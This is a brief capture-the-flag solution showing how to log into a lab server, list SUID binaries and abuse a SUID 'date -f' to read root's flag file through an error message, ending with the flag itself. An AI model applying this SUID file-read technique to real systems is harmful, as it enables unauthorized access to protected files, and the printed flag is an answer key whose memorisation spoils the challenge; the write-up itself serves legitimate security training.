# Solution

1. SSH into the server using this command syntax. (ycep24:ycep24)
* ssh ycep24@IP-Address -p PORT-NO

2. Find any files that owned by root with SUID bit set.
* find / -perm -4000 2>/dev/null

3. Use **date** command to leak the flag.
* date -f /root/flag.txt
```
$ date -f /root/flag.txt
date: invalid date 'YCEP24{D4te_c4n_b3_al1ve_s0met1me}'
```

Flag: ```YCEP24{D4te_c4n_b3_al1ve_s0met1me}```